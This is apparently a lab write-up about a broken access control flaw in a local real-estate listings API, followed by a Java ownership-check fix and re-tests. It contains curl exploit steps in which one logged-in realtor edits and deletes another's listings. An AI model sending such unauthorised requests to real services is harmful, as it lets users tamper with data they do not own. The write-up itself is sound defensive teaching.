# Broken Access Control — Editing & Deleting Other People's Listings

The `update()` and `delete()` methods only check that a listing **exists** — they never check that the logged-in realtor actually **owns** it. So once you're logged in as anyone, you can mess with anyone's listings. Here's the proof.

---

### 1. Check the starting listings

```
$ curl http://localhost:7000/listings

[
  {"id":1,"title":"Cosy 2-bed in Melville","price":1250000.00,"realtorId":1},
  {"id":2,"title":"Modern loft in Braamfontein","price":875000.00,"realtorId":1},
  {"id":3,"title":"Family home in Randburg","price":2100000.00,"realtorId":2}
]
```

Listings 1 & 2 belong to **alice** (realtorId 1). Listing 3 belongs to **bob** (realtorId 2).

### 2. Log in as alice

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"

HTTP/1.1 200 OK
{"realtorId":1,"token":"3c5a9da7-..."}
```

### 3. Exploit — edit bob's listing while logged in as alice

```
$ curl -i -X PUT http://localhost:7000/listings/3 \
  -H "Authorization: 3c5a9da7-..." \
  -d "title=HACKED by alice" \
  -d "description=This should not be allowed" \
  -d "price=1"

HTTP/1.1 200 OK
{"message":"Listing updated"}
```

It went through. **alice just edited a listing she doesn't own.**

### 4. Confirm the damage

```
$ curl http://localhost:7000/listings/3

{"id":3,"title":"HACKED by alice","description":"This should not be allowed","price":1.00,"realtorId":2}
```

Yep — bob's listing now says "HACKED by alice," and its price got dropped to R1. All while `realtorId` still correctly shows it belongs to bob (2) — proving the app *knows* who owns it, it just never bothers to check.

### 5. Log in as bob

```
$ curl -i -X POST http://localhost:7000/login -d "username=bob" -d "password=hunter2"

HTTP/1.1 200 OK
{"realtorId":2,"token":"71940772-..."}
```

### 6. Exploit — delete alice's listing while logged in as bob

```
$ curl -i -X DELETE http://localhost:7000/listings/1 \
  -H "Authorization: 71940772-..."

HTTP/1.1 200 OK
{"message":"Listing deleted"}
```

Deleted — no ownership check, no problem (for the attacker, anyway).

### 7. Confirm it's gone

```
$ curl http://localhost:7000/listings

[
  {"id":2,"title":"Modern loft in Braamfontein","price":875000.00,"realtorId":1},
  {"id":3,"title":"HACKED by alice","price":1.00,"realtorId":2}
]
```

Listing 1 (alice's "Cosy 2-bed in Melville") is gone completely, deleted by bob, who never owned it.

---

### Screenshots

- `Screenshot3.png` — checking listings, logging in as alice, editing bob's listing, confirming the hack
- `Screenshot4.png` — logging in as bob, deleting alice's listing, confirming it's gone

### The takeaway

`update()` and `delete()` only ask *"does this listing ID exist?"* — never *"does this belong to the person asking?"* The fix (Phase 4) is to check both id **and** `realtor_id` together in the query (`WHERE id = ? AND realtor_id = ?`), so an edit or delete only ever succeeds against your own listings.

---

## Remediation

The `PUT` and `DELETE` handlers in `Main.java` now fetch the listing first, then compare its `realtorId` against the logged-in user's ID (resolved server-side from the session token, not from anything the client sends) before allowing the mutation:

```java
Listing listing = listingDao.findById(listingId);

if (listing.getRealtorId() != realtorId) {
    ctx.status(403).result("Forbidden: not your listing");
    return;
}
```

This check happens in the handler rather than the SQL `WHERE` clause, but the effect is the same as combining `id` and `realtor_id` in the query: an edit or delete can only succeed against a listing you actually own.

### 8. Re-test — alice tries to edit bob's listing again

```
$ curl -i -X PUT http://localhost:7000/listings/3 \
  -H "Authorization: 3c5a9da7-..." \
  -d "title=HACKED by alice again" \
  -d "description=trying again" \
  -d "price=1"

HTTP/1.1 403 Forbidden
Forbidden: not your listing
```

Blocked. Bob's listing is untouched.

### 9. Re-test — bob tries to delete alice's listing again

```
$ curl -i -X DELETE http://localhost:7000/listings/2 \
  -H "Authorization: 71940772-..."

HTTP/1.1 403 Forbidden
Forbidden: not your listing
```

Blocked as well.

### 10. Confirm the listings are untouched

```
$ curl http://localhost:7000/listings

[
  {"id":2,"title":"Modern loft in Braamfontein","price":875000.00,"realtorId":1},
  {"id":3,"title":"Family home in Randburg","price":2100000.00,"realtorId":2}
]
```

Both listings still belong to their original owners with their original data — the ownership check stops the mutation before it ever reaches the database.

### Screenshots

- `Screenshot5.png` — alice blocked from editing bob's listing (403)
- `Screenshot6.png` — bob blocked from deleting alice's listing (403)

### Note on legitimate edits

To confirm the fix doesn't break real usage, the same request works fine when alice edits her *own* listing:

```
$ curl -i -X PUT http://localhost:7000/listings/2 \
  -H "Authorization: 3c5a9da7-..." \
  -d "title=Modern loft in Braamfontein (price drop!)" \
  -d "description=Open plan, great for students" \
  -d "price=850000"

HTTP/1.1 200 OK
{"message":"Listing updated"}
```